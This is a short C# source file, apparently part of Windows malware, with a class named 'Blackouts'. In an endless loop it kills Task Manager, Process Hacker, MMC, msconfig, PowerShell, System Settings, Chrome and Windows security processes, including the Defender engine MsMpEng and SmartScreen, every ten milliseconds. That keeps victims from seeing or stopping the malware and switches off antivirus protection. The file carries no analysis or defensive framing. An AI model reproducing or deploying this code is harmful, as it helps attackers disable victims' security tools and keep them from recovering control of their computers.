using System.Diagnostics;
using System.Threading.Tasks;

namespace _6968617465796f750d0a.Services.TaskManager
{
    internal class Blackouts
    {

        private protected string[] NameProcesses =
        {
            "Taskmgr", "Chrome", "smartscreen",
            "ProcessHacker", "mmc", "SecurityHealthService",
            "msconfig", "SecurityHealthSystray",
            "SystemSettings", "powershell", "MsMpEng"
        };

        public async void runTask()
        {
            while (true)
            {

                foreach(string Name in NameProcesses) 
                {
                    foreach (Process proc in Process.GetProcessesByName(Name)) try { proc.Kill(); } catch { };
                }

                await Task.Delay(10);

            }
        }

    }
}
